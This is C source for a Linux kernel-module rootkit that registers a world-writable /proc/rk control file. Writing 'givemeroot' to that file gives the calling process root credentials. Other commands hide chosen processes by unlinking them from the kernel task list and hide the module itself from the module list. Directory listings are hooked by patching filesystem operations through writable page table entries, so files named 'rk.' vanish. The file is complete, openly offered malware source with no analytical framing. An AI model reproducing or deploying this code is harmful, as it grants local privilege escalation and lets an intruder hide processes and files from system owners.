#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>

#define MAX_PIDS 50

char name[] = "";

//static filldir_t proc_filldir_orig;
static filldir_t fs_filldir_orig;

struct proc_dir_entry *next, *parent, *subdir;

//static int (*proc_iterate_orig)(struct file *, struct dir_context *);
static int (*fs_iterate_orig)(struct file *, struct dir_context *);

static int size, temp;
static int current_pid = 0;

static char module_status[1024];
static char pids_to_hide[MAX_PIDS][8];
static char hide_files = 1;
static char module_hidden = 0;

//static struct file_operations *proc_fops;
static struct file_operations *fs_fops;
static struct proc_dir_entry *proc_rk;
//static struct proc_dir_entry *proc_root;
static struct task_struct* proc_to_hide[MAX_PIDS];
static struct list_head *module_previous;
static struct list_head *module_kobj_previous;

#define MIN(a,b) \
( \
    { \
        typeof(a) _a = (a); \
        typeof(b) _b = (b); \
        _a < _b ? _a : _b; \
    } \
)

void module_hide(void)
{
    if(module_hidden)
        return;

    module_previous = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
    kobject_del(&THIS_MODULE->mkobj.kobj);
    list_del(&THIS_MODULE->mkobj.kobj.entry);
    module_hidden = !module_hidden;
}

void module_show(void)
{
    int result;

    if(!module_hidden)
        return;

    list_add(&THIS_MODULE->list, module_previous);
    result = kobject_add(&THIS_MODULE->mkobj.kobj,
        THIS_MODULE->mkobj.kobj.parent, "rk");
    module_hidden = !module_hidden;
}

static ssize_t rk_read(struct file *file, char __user *buffer,
    size_t count, loff_t *ppos)
{
    if(count > temp)
        count = temp;

    temp = (temp - count);

    if(copy_to_user(buffer, module_status, count));

    if(count == 0)
    {
        sprintf(module_status,
            "CMDS: \n\
            -> givemeroot  - uid and gid 0 for writing process \n\
            ->------------------------------------------------- \n\
            -> nhprocXXXXX - proc id to be norm hidden \n\
            -> dhprocXXXXX - proc id to be deep hidden \n\
            -> uhprocXXXXX - proc id to be unhidden \n\
            ->------------------------------------------------- \n\
            -> thfile      - toggle hidden files \n\
            -> nhmodu      - a normal hidden module \n\
            -> uhmodu      - a normal unhidden module \n\
            ->------------------------------------------------- \n\
            -> Files hidden?:: %d \n\
            -> Module hidden?: %d \n", hide_files, module_hidden);
        size = strlen(module_status);
        temp = size;
    }

    return count;
}

static ssize_t rk_write(struct file *file, const char __user *buffer,
    size_t count, loff_t *ppos)
{
    if(!strncmp(buffer, "givemeroot", MIN(10, count)))
    {
        return commit_creds(prepare_kernel_cred(0));
    }
    else if(!strncmp(buffer, "nhproc", MIN(6, count)))
    {
        if(current_pid < MAX_PIDS)
            strncpy(pids_to_hide[current_pid++], buffer + 2, MIN(7, count - 2));
    }
    else if(!strncmp(buffer, "dhproc", MIN(6, count)))
    {
        if(current_pid < MAX_PIDS)
        {
            long pid;
            char pid_s[MIN(7, count - 2) + 1];

            struct task_struct *p;

            pid_s[MIN(7, count - 2)] = 0;
            strncpy(pids_to_hide[current_pid++], buffer + 2, MIN(7, count - 2));
            strncpy(pid_s, buffer + 2, MIN(7, count - 2));
            for_each_process(p)
            {
                if(kstrtol(pid_s, 10, &pid));
                if(pid == p->pid)
                {
                    printk("--------%ld: %s\n", pid, p->comm);
                    proc_to_hide[current_pid] = p;
                    p->tasks.prev->next = p->tasks.next;
                    p->tasks.next->prev = p->tasks.prev;
                }
            }
        }
    }
    else if(!strncmp(buffer, "uhproc", MIN(6, count)))
    {
        if(current_pid > 0 && proc_to_hide[current_pid] != NULL)
            list_add(&proc_to_hide[current_pid]->tasks,
                proc_to_hide[current_pid]->tasks.prev);

        if(current_pid > 0)
            current_pid--;
    }
    else if(!strncmp(buffer, "thfile", MIN(6, count)))
    {
        hide_files = !hide_files;
    }
    else if(!strncmp(buffer, "nhmodu", MIN(6, count)))
    {
        module_hide();
    }
    else if(!strncmp(buffer, "uhmodu", MIN(6, count)))
    {
        module_show();
    }

    return count;
}

static void set_addr_rw(void *addr)
{
    unsigned int level;

    pte_t *pte = lookup_address((unsigned long) addr, &level);

    if(pte->pte &~ _PAGE_RW)
        pte->pte |= _PAGE_RW;
}

static void set_addr_ro(void *addr)
{
    unsigned int level;

    pte_t *pte = lookup_address((unsigned long) addr, &level);
    pte->pte = pte->pte &~_PAGE_RW;
}

/*
static int proc_filldir_new(void *buf, const char *name, int namelen,
    loff_t offset, u64 ino, unsigned d_type)
{
    int i;

    for(i = 0; i < current_pid; i++)
    {
        if(!strcmp(name, pids_to_hide[i]))
            return 0;
    }

    if(!strcmp(name, "rk"))
        return 0;

    return proc_filldir_orig(buf, name, namelen, offset, ino, d_type);
}

static int proc_iterate_new(struct file *filp, struct dir_context *ctx)
{
    proc_filldir_orig = ctx->actor;
    *((filldir_t *)&ctx->actor) = &proc_filldir_new;

    return proc_iterate_orig(filp, ctx);
}
*/

static int fs_filldir_new(void *buf, const char *name, int namelen,
    loff_t offset, u64 ino, unsigned d_type)
{
    if(hide_files && (!strncmp(name, "rk.", 3) || !strncmp(name, "10-rk.", 6)))
        return 0;

    return fs_filldir_orig(buf, name, namelen, offset, ino, d_type);
}

static int fs_iterate_new(struct file *filp, struct dir_context *ctx)
{
    fs_filldir_orig = ctx->actor;
    *((filldir_t*)&ctx->actor) = &fs_filldir_new;

    return fs_iterate_orig(filp, ctx);
}

static const struct file_operations proc_rk_fops =
{
    .owner = THIS_MODULE,
    .read = rk_read,
    .write = rk_write,
};

static int __init procfs_init(void)
{
    proc_rk = proc_create("rk", 0666, NULL, &proc_rk_fops);
    if(proc_rk == NULL)
        return 0;

    /*
    proc_root = proc_rk->parent;
    if(proc_root == NULL || strcmp(proc_root->name, "/proc") != 0)
        return 0;
    */

    sprintf(module_status,
        "CMDS: \n\
        -> givemeroot  - uid and gid 0 for writing process \n\
        ->------------------------------------------------- \n\
        -> nhprocXXXXX - proc id to be norm hidden \n\
        -> dhprocXXXXX - proc id to be deep hidden \n\
        -> uhprocXXXXX - proc id to be unhidden \n\
        ->------------------------------------------------- \n\
        -> thfile      - toggle hidden files \n\
        -> nhmodu      - a normal hidden module \n\
        -> uhmodu      - a normal unhidden module \n\
        ->------------------------------------------------- \n\
        -> Files hidden?:: %d \n\
        -> Module hidden?: %d \n", hide_files, module_hidden);
    size = strlen(module_status);
    temp = size;

    // TODO: FIX?
    /*
    proc_fops = ((struct file_operations*)proc_root->proc_fops);
    proc_iterate_orig = proc_fops->iterate;
    set_addr_rw(proc_fops);
    proc_fops->iterate = proc_iterate_new;
    set_addr_ro(proc_fops);
    */

    return 1;
}


static int __init fs_init(void)
{
    struct file *etc_filp;

    //get file_operations of /etc
    etc_filp = filp_open("/etc", O_RDONLY, 0);
    if(etc_filp == NULL)
        return 0;

    fs_fops = (struct file_operations*)etc_filp->f_op;
    filp_close(etc_filp, NULL);

    //substitute iterate of fs on which /etc is
    fs_iterate_orig = fs_fops->iterate;
    set_addr_rw(fs_fops);
    fs_fops->iterate = fs_iterate_new;
    set_addr_ro(fs_fops);

    return 1;
}

static void procfs_clean(void)
{
    if(proc_rk != NULL)
    {
        remove_proc_entry("rk", NULL);
        proc_rk = NULL;
    }
    /*
    if(proc_fops != NULL && proc_iterate_orig != NULL)
    {
        set_addr_rw(proc_fops);
        proc_fops->iterate = proc_iterate_orig;
        set_addr_ro(proc_fops);
    }
    */
}

static void fs_clean(void)
{
    if(fs_fops != NULL && fs_iterate_orig != NULL)
    {
        set_addr_rw(fs_fops);
        fs_fops->iterate = fs_iterate_orig;
        set_addr_ro(fs_fops);
    }
}

static int __init rk_init(void)
{
    printk("Adding Module!\n");
    if(!procfs_init() || !fs_init())
    {
        procfs_clean();
        fs_clean();
        return 1;
    }
    //module_hide();

    return 0;
}

static void __exit rk_exit(void)
{
    printk("Removing Module!\n");
    procfs_clean();
    fs_clean();
}

MODULE_LICENSE("GPL");
module_init(rk_init);
module_exit(rk_exit);
